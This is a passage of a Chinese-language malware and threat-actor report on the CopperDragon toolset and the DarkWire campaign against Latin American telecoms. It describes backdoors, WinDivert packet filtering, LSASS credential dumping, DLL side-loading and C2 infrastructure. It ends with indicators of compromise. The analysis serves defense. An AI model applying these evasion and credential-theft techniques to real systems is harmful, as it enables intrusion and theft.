<code>0x0e0e0e0e</code>。</p><figure><img width=\"626\" height=\"785\" src=\"/dailyinfo/media/2c1f0dd9a75c6733.webp\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 12 – SparrowShell 所基于的 Reptile rootkit。</figcaption></figure><p><strong>被动式 Sparrow 后门</strong></p><p>我们观察到，Windows 后门 <strong>SparrowDoor</strong> 的某些版本具备内核级数据包拦截能力，并为 x86 和 x64 嵌入了作为资源的 <a href=\"https://github.com/basil00/WinDivert\"><strong>WinDivert</strong></a> 驱动程序。WinDivert 是一款用于网络数据包捕获和操作的合法驱动程序，常被 VPN、防火墙和隧道应用等实用程序使用。</p><figure><img width=\"1024\" height=\"942\" src=\"/dailyinfo/media/084412a20e844ab6.webp\" srcset=\"/dailyinfo/media/a292f12dcae2894e.webp 720w, /dailyinfo/media/ba22b9e1b6401b48.webp 1200w, /dailyinfo/media/084412a20e844ab6.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 13 – 被动式 Sparrow 通信方案。</figcaption></figure><p>该行为体滥用该驱动程序将 <strong>SparrowDoor</strong> 转换为被动式后门，在内核级别拦截和操作数据包，使其流量更难被发现。这使后门能够在一个端口上进行内部监听，同时通过外部可访问的端口（如已被合法服务使用的 <strong>443</strong>）接收连接。</p><p>该后门应用严格的过滤器，拦截从特定源 IP 地址发往合法服务端口的连接。它会操作数据包，并将目标端口重写为后端的内部监听端口，通常是一个高位端口，例如 <strong>49628</strong>。对于响应流量，它会将源端口重写回外部服务端口，使响应看起来源自该合法服务。</p><pre>(\n    (inbound and tcp.DstPort == %d       // Legitimate external listening port\n        and ip.SrcAddr == %s) or         // Connections from a specific source IP\n    (outbound and tcp.SrcPort == %d)     // Backdoor's internal listening port\n)</pre><p>传入连接会针对魔术值 <code>0x11223344</code> 进行检查。匹配的请求将排队进行后门命令处理，而不匹配的流量则转发至 <code>127.0.0.1:&lt;external_port&gt;</code> 处的合法服务，从而允许正常连接继续运行。</p><h3 id=\"sec-14\">Melofee</h3><p>在分析 <strong>SparrowShell</strong> 时，我们发现它与 <a href=\"https://exatrack.com/publications/melofee.html\"><strong>Melofee</strong></a> 后门存在若干相似之处，后者于 2023 年首次被发现。两者都使用经过类似修改的开源 <strong>Reptile</strong> rootkit 版本，并且在解密、加载和激活 rootkit 的方式上具有代码相似性。二者还支持相同的 <code>hide</code> 和 <code>show</code> 命令行参数来控制 rootkit。这些相似之处促使一些厂商将 SparrowShell 归类为 Melofee。</p><p>当我们分析 Melofee 样本时，发现 Melofee 与 CopperDragon 的 SparrowShell 之间的联系变得更加密切，尤其是在其自签名证书方面，两者还具有共同的基础设施特征。二者都使用诸如 <code>Some-State</code> 和 <code>O=Internet Widgits Pty Ltd</code> 的证书主题值，并在通用名称 (CN) 字段中冒充公共 DNS 服务器。二者还使用了多年以前创建、且在过期后长期继续使用的证书。</p><figure><img width=\"562\" height=\"120\" src=\"/dailyinfo/media/42937dbd2c1b0b88.webp\" loading=\"lazy\" decoding=\"async\" alt=\"TernDoor certificate from Talos blog 2026\"><figcaption>图 14 – 2026 年 Talos <a href=\"https://blog.talosintelligence.com/uat-9244/\">博客</a>中的 TernDoor 证书。</figcaption></figure><figure><img width=\"535\" height=\"126\" src=\"/dailyinfo/media/6b1a93d0ce0593ca.webp\" loading=\"lazy\" decoding=\"async\" alt=\"Melofee certificate on Virus Total from 2026\"><figcaption>图 15 – 2026 年 Virus Total 上的 Melofee 证书。</figcaption></figure><p>基于这些发现，包括代码相似性和基础设施重叠，我们评估 <strong>CopperDragon</strong> 也参与维护和提供 <strong>Melofee</strong> 变种。</p><h2 id=\"sec-15\"><strong>DarkWire：入侵电信运营商</strong></h2><figure><img width=\"1024\" height=\"446\" src=\"/dailyinfo/media/5466199e3992413d.webp\" srcset=\"/dailyinfo/media/e6a78a1dbdf3c5e2.webp 720w, /dailyinfo/media/9bdc1c710fed3a46.webp 1200w, /dailyinfo/media/5466199e3992413d.webp 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" alt=\"\"><figcaption>图 16 – DarkWire 工具集。</figcaption></figure><p>2025 年年中，我们发现了一波新的活动，追踪编号为 <strong>DarkWire</strong>。虽然最初集中在拉丁美洲，但更近期的入侵表明其已扩张到该地区之外。受害者画像显示，其明显聚焦于电信运营商和政府实体，包括该地区至少三家主要电信运营商，以及外交和司法部门。</p><p>在整个调查过程中，我们发现了多个定制工具，表明该行为者维持着一套更广泛的专有工具库。该行为者部署了两个新发现的后门，我们命名为 <strong>CopperDoor</strong> 和 <strong>CopperDNS</strong>。它们似乎作为该组织的主要植入物，并可能已取代 <strong>SparrowDoor</strong> 系列。</p><p>除这些后门之外，还观察到该行为者部署了若干其他定制工具，包括 <strong>CopperProxy</strong> 和 <strong>PyProxy</strong> 等代理工具，以及 <strong>CopperLsass</strong>——一个用于转储 <strong>LSASS</strong> 进程以收集凭据的专用模块。包括这些新后门在内的大多数后渗透工具，均由一个独特的加载器加载，我们将其命名为 <strong>CopperLoader。</strong></p><p>除这些工具外，操作人员还使用了公开可用的软件，例如被重命名为 <code>vmtoolsd.exe</code> 和 <code>csrss.exe</code> 等名称的 SoftEther VPN。为进行横向移动，他们通过 SMB 传输文件，并通过 WMI 执行远程命令，使用 <code>wmiexec</code>。</p><h3 id=\"sec-16\">CopperLoader</h3><p><strong>CopperLoader</strong> 是一种反射式加载器，通常通过 DLL 侧加载部署。它由写入被劫持原始 DLL 改写版本中的位置无关 shellcode 组成。在某些情况下，CopperLoader 并非最初被侧加载的组件，而是作为由另一个 shellcode 加载器投递的第二阶段 shellcode 载荷到达。</p><p>CopperLoader 从其所在目录下的 <code>.dat</code> 文件中加载加密的下一阶段 PE 模块。这些文件以加密形式包含下一阶段模块。虽然各样本的具体布局有所不同，但一组一致的嵌入头部提供了处理每个载荷所需的信息：模块长度、RC4 解密密钥，以及在某些情况下的后门配置。</p><p>解密后的模块中 MZ 和 PE 签名已被移除，从而阻碍内存扫描和自动提取。</p><p>我们观察到 CopperLoader 投递了四种独特工具：<strong>CopperDoor</strong>、<strong>CopperDNS</strong>、<strong>CopperProxy</strong> 和 <strong>CopperLsass</strong>。</p><p><strong>CopperDoor 与 CopperDNS</strong></p><p><strong>DarkWire</strong> 行动中使用的主要后门是 <strong>CopperDoor</strong>，这是一个新发现的高级模块化后门，完全驻留在内存中。CopperDoor 使用了诸如调用栈欺骗和基于 gadget 的执行等新技术来规避 EDR。该恶意软件又称 <strong>SparroWocky</strong>，最近由 ESET 作为其 FamousSparrow 活动研究的一部分<a href=\"https://www.welivesecurity.com/en/eset-research/beware-sparrowock-backdoor-bites-commands-catch/\">深入分析</a>。</p><p>除 CopperDoor 外，我们还观察到该后门的一个变种，它通过使用 <strong>MX 查询</strong> 的 DNS 隧道进行通信，我们将其命名为 <strong>CopperDNS</strong>。</p><figure><img width=\"535\" height=\"86\" src=\"/dailyinfo/media/d190677b88480310.webp\" loading=\"lazy\" decoding=\"async\" alt=\"DNS Tunneling send flow in CopperDNS\"><figcaption>图 17 – CopperDNS 中的 DNS 隧道发送流程。</figcaption></figure><p><strong>CopperProxy &amp; PyProxy</strong></p><p><strong>CopperProxy</strong> 是一款 SOCKS5 代理工具。它接受 IP 地址和 TCP 端口作为命令行参数，为指定端口配置名为 <code>ss1</code> 的 Windows 防火墙规则，并侦听传入连接，最多支持 300 个并发客户端。对于每个连接，它会处理 SOCKS5 协商、连接到请求的目标，并双向转发流量。</p><p><strong>PyProxy</strong> 是一款用 Python 编写的轻量级 UDP 中继工具，并使用 PyInstaller 打包为独立可执行文件。它在固定的本地 UDP 端口上侦听，并在本地客户端与硬编码的远程 IP 地址和端口之间双向转发流量。</p><figure><img width=\"601\" height=\"372\" src=\"/dailyinfo/media/3b1730868d6f5485.webp\" loading=\"lazy\" decoding=\"async\" alt=\"Decompiled PyProxy python code\"><figcaption>图 18 – 反编译后的 PyProxy Python 代码。</figcaption></figure><p><strong>CopperLsass</strong></p><p><strong>CopperLsass</strong> 是一个 DLL 模块，它通过 RPC 将名为 <code>slave.dll</code> 的组件注册为安全包，从而加载到 LSASS 中。进入 LSASS 后，<code>slave.dll</code> 使用 Windows 库 <code>comsvcs.dll</code> 和辅助 DLL <code>dep.dll</code> 创建完整的 LSASS 内存转储，使用自定义的 SUB-XOR-ADD 算法对其进行加密，然后删除原始转储。在观察到的入侵活动中，文件在被外传前会重命名为 <code>1.png</code>，以伪装成图像文件。</p><h3 id=\"sec-17\">执行与暂存</h3><p>该行动主要依赖 DLL 侧加载作为主要执行技术，经常滥用在野外其他威胁行为体中并不广泛出现的可执行文件。</p><p>我们观察到被使用的可执行文件包括：</p><figure><table><thead><tr><th>DLL 名称</th><th>原始 EXE 名称</th></tr></thead><tbody><tr><td>ncpmif32.dll</td><td>ncptrcw.exe</td></tr><tr><td>winfsp.dll</td><td>fsptool.exe</td></tr><tr><td>libvlccore.dll</td><td>vlc.exe</td></tr><tr><td>DukeQt.dll</td><td>gethwid.exe</td></tr><tr><td>zCrashReport64.dll</td><td>zCrashReport64.exe</td></tr></tbody></table></figure><p>为尽量减少其留下的痕迹，操作人员有意避免在磁盘上创建新目录，而是将其工具放入现有系统路径中。</p><p>我们观察到的使用路径包括：</p><figure><table><thead><tr><th>路径</th></tr></thead><tbody><tr><td>C:\\Program Files\\7-Zip\\Lang</td></tr><tr><td>C:\\Windows\\debug</td></tr><tr><td>C:\\Windows\\System32</td></tr><tr><td>C:\\ProgramData\\vmware\\logs</td></tr><tr><td>C:\\ProgramData\\Oracle\\Java</td></tr><tr><td>C:\\ProgramData\\USOShared</td></tr><tr><td>C:\\ProgramData\\Waves</td></tr></tbody></table></figure><h3 id=\"sec-18\">DarkWire 基础设施</h3><p>CopperDoor 基础设施展现出更高的操作安全性。相关 IP 地址分布在多种自治系统中。这些服务器通常开放 443 端口，并通过封装在 TLS 中的原始 TCP 进行通信，而非使用标准 HTTPS。在若干情况下，这些 C2 服务器部署的 TLS 证书所含通用名称（CN）值与目标受害组织关联的域名非常相似。</p><figure><table><thead><tr><th>ASN</th></tr></thead><tbody><tr><td>AS-VULTR, US (AS20473)</td></tr><tr><td>KAOPU-HK Kaopu Cloud HK Limited, HK (AS138915)</td></tr><tr><td>LATITUDE-SH (AS396356)</td></tr><tr><td>XNNET, US (AS6134)</td></tr><tr><td>CDNEXT, GB (AS212238)</td></tr><tr><td>ONEPROVIDER-AS BrainStorm Network, Inc, CA (AS136258)</td></tr></tbody></table></figure><p>相比之下，与 CopperDNS 关联的基础设施主要充当 DNS 隧道 C2 通道，由基于 Windows 的主机组成。这些系统始终托管于 AS20473、AS-VULTR，开放高位端口（最常见的是 6532），并在多个节点间复用一组独特的 TLS 证书（SHA-256：<code>ee4a8b81fe3864582efc27a77f806990e2602dcc36447ddda4b3a230a473d575</code>）。</p><pre>Subject: CN=8.8.8.8\nIssuer: CN=8.8.8.8\nSerial Number: 0x20a61422b0352cfc9ef688dc800bcdf810f1fe7d\nNot Before: 2025-07-16T03:10:29\nNot After: 2026-07-16T03:10:29\nFingerprint SHA-1: de32c58a8087cc4f24b9eb65c8ff4516f0f65f13</pre><p>我们在两套基础设施中还观察到一个额外模式，即地理位置与目标区域相匹配。多数 IP 地址位于拉丁美洲，通常与受害组织位于同一国家。这种地理邻近性可能有助于恶意流量混入合法网络活动，并降低被发现的可能性。</p><h3 id=\"sec-19\">DarkWire 归因</h3><p>除了一般的设计模式外，我们未在 <strong>DarkWire cluster</strong> 与 <strong>CopperDragon</strong> 工具集中的其他工具之间发现直接的代码相似性。不过，我们发现其基础设施与此前关于 <strong>FamousSparrow</strong> 活动的一份报告存在关联。域名 <code>amelicen[.]com</code> 曾被报告为 SparrowDoor C2 服务器，而我们的遥测数据显示，同一域名也是 <strong>CopperDNS</strong> 基础设施的一部分。</p><p>我们还观察到 VirusTotal 的提交者在大致相同的时间上传了与 <strong>SparrowDoor</strong> 和 <strong>DarkWire</strong> 均相关的文件，这表明这些工具可能曾用于同一次攻击。在最近的一份报告中，ESET 还观察到，在已受感染的计算机上，SparrowDoor 被 CopperDoor（又称 <a href=\"https://www.welivesecurity.com/en/eset-research/beware-sparrowock-backdoor-bites-commands-catch/\"><strong>SparroWocky</strong></a>）所替换，这进一步印证了我们发现的关联。</p><h2 id=\"sec-20\">摘要</h2><p><strong>CopperDragon</strong> 是我们持续跟踪的一个实体，可能是支持多个中国关联威胁行为体的数字军需官，这些行为体使用跨平台的 <strong>Sparrow</strong> 框架。</p><p>我们识别出至少三个活动集群，每个集群都使用自己的主后门，并针对不同的地区和组织：</p><ul>\n<li><strong>SilentDelivery</strong> – 在欧洲和亚洲的水坑攻击中使用新发现的 <strong>SquadC</strong> 以及 <strong>SparrowDoor</strong> 的一个变种。</li>\n\n\n\n<li><strong>OceanGate</strong> – 主要在亚洲活动，使用 <strong>SparrowDoor</strong> 和 <strong>SparrowShell</strong> 的变种，并可能与 <strong>Melofee</strong> 存在关联。</li>\n\n\n\n<li><strong>DarkWire</strong> – 针对拉丁美洲的电信运营商和政府组织，使用新的 <strong>CopperDoor</strong> 和 <strong>CopperDNS</strong> 后门。</li>\n</ul><p>这些发现为理解 CopperDragon 的潜在使用者，以及更精确地跟踪此前被归入 FamousSparrow 名下的活动奠定了基础。在高度互联的中国关联威胁生态中，共享的恶意软件和基础设施可能会模糊不同运营方和活动之间的界限。然而，使用相同的后门或 C2 基础设施并不一定意味着两次入侵是由同一行为体实施的。</p><h2 id=\"sec-21\"><br>技术附录</h2><p>工具完整列表：</p><figure><table><thead><tr><th>工具</th><th>平台</th><th>用途</th></tr></thead><tbody><tr><td>CopperLoader</td><td>Windows</td><td>解密并以反射方式加载 CopperDoor、CopperDNS、CopperProxy 和 CopperLsass 的 DLL 加载器。</td></tr><tr><td>CopperSplit</td><td>Windows</td><td>使用拆分 API 字符串、服务持久化以及利用计算机名称加密的载荷的加载器变种。未恢复最终载荷。</td></tr><tr><td>CopperDoor</td><td>Windows</td><td>支持侦察、命令执行、内存模块、插件和反向端口转发的模块化后门。</td></tr><tr><td>SparrowDoor</td><td>Windows</td><td>支持持久化、进程镂空和执行额外载荷的后门。</td></tr><tr><td>CopperDNS</td><td>Windows</td><td>通过 DNS MX 查询隧道传输 C2 通信的 CopperDoor 变种。</td></tr><tr><td>CopperProxy</td><td>Windows</td><td>支持网络中继和内部枢转的 SOCKS5 代理。</td></tr><tr><td>PyProxy</td><td>Windows</td><td>在 DarkWire 行动期间部署的 UDP 代理实用工具。</td></tr><tr><td>CopperLsass</td><td>Windows</td><td>将组件加载到 LSASS 中以转储其内存，然后对转储内容进行加密以便收集。</td></tr><tr><td>CopperLsa</td><td>Windows</td><td>在身份验证期间拦截凭据的恶意 LSA 安全支持提供程序。</td></tr><tr><td>CopperLogger</td><td>Windows</td><td>捕获按键、剪贴板数据以及窗口和进程上下文的内存键盘记录器。</td></tr><tr><td>CopperAdu</td><td>Windows</td><td>创建一个隐藏的管理员账户，启用 SMB 服务，并配置远程管理访问。</td></tr><tr><td>CopperList</td><td>Windows</td><td>收集系统信息和文件元数据，然后暂存一份压缩清单。</td></tr><tr><td>SquadC</td><td>Windows</td><td>通过伪造的证书修复安装程序投递后门；支持命令执行、文件操作、侦察和屏幕截图。</td></tr><tr><td>SparrowShell</td><td>Linux</td><td>支持远程命令、文件操作、持久化和网络枢纽转移的模块化后门。（SparrowDoor 后门的 Linux 版本）</td></tr><tr><td>AnnobinDoor</td><td>Linux</td><td>支持远程 shell、文件传输、SOCKS 代理、SSH 隧道和端口转发的 Go 后门。</td></tr><tr><td>被植入木马的 SSH</td><td>Linux</td><td>经修改的 OpenSSH 客户端，可捕获密码、身份验证响应和私钥口令。</td></tr><tr><td>被植入木马的 SSHD</td><td>Linux</td><td>经修改的 OpenSSH 服务器，可捕获传入的身份验证凭据。</td></tr><tr><td>经修改的 Reptile rootkit</td><td>Linux</td><td>SparrowShell 内核组件，用于隐藏进程、文件和网络活动。</td></tr><tr><td>FRP / frpc</td><td>Linux</td><td>反向代理和隧道。</td></tr><tr><td>Chisel</td><td>Linux</td><td>基于 HTTP 的 TCP 隧道。</td></tr><tr><td>SoftEther VPN</td><td>Windows</td><td>为操作员访问和枢纽转移提供 VPN 连接。</td></tr><tr><td>WinDivert</td><td>Windows</td><td>SparrowDoor 使用的驱动，用于在内核级别拦截和操纵网络流量。：</td></tr></tbody></table></figure><h2 id=\"sec-22\"><br>IOC</h2><h3 id=\"sec-23\"><strong>SilentDelivery Campaign</strong> <strong>文件</strong></h3><figure><table><thead><tr><th>恶意软件</th><th>名称</th><th>哈希</th></tr></thead><tbody><tr><td>SquadC 安装程序</td><td>CertFixer.msi</td><td>715c206629f59ff5b0134a33362162ce7a40a9b25aa17f0543dc9648d51a67cf</td></tr><tr><td>SquadC 安装程序</td><td>CertFixer.msi</td><td>b379d07ba81d4190490d9893b2d6d830ff594e042dce26053ef07794d0403787</td></tr><tr><td>SquadC 安装程序</td><td>CertFixer.msi</td><td>e5f7bbfc187264336dea5dfebfb5a7dd1e7fcdcc9692db55fbe6eb4d28f027bc</td></tr><tr><td>SquadC 安装程序</td><td>CertFixer.msi</td><td>e9f2f42ea3611096879f4152a7d78bb3a78a4dbead1c3b7e366dce485207551f</td></tr><tr><td>SquadC 安装程序</td><td>CertFixer.msi</td><td>f44159bec1d4d3f340652cd3c6e250dcf2bdb266e5400d3e267f0466d290dda0</td></tr><tr><td>SquadC 安装程序</td><td>CertFixer.msi</td><td>f51dc5e1848daee4e607d46faa25033e1151060cd3482ad4439754440d6c4c01</td></tr><tr><td>SquadC 加载器</td><td>MSVCR110.dll</td><td>8bbc395a7a0faff074c6e31c7da37bf1540a4e7ec3d80870f8d6bd1f5d4cecbb</td></tr><tr><td>SquadC 加载器</td><td>dtfbase.dll</td><td>054c0ffb08eb7830de1ff2356af4d2ed696f01111a8c2e78e3a4ddc940287e48</td></tr><tr><td>SquadC 加载器</td><td>WTSAPI32.dll</td><td>b60404c1299e69df029d9817dcf69f9fe325ecc990e16bc7758f56ce5714184b</td></tr><tr><td>SquadC 加载器</td><td>MSVCR110.dll</td><td>f23e5391656b178bc0ab510b0fca6ffbd963cf94870c82a5920f0f338f561f18</td></tr></tbody></table></figure><h3 id=\"sec-24\"><strong>SilentDelivery Campaign</strong> <strong>基础设施</strong></h3><pre>microsfot[.]vip<br>microscoft[.]vip<br>aistei[.]com<br>astorialaza[.]com<br>135.136.135[.]54<br>103.141.235[.]123<br>109.205.195[.]131<br>158.255.213[.]189<br>165.154.227[.]16<br>45.197.12[.]11<br>91.210.164[.]5</pre><h3 id=\"sec-25\"><strong>OceanGate Campaign</strong> <strong>文件</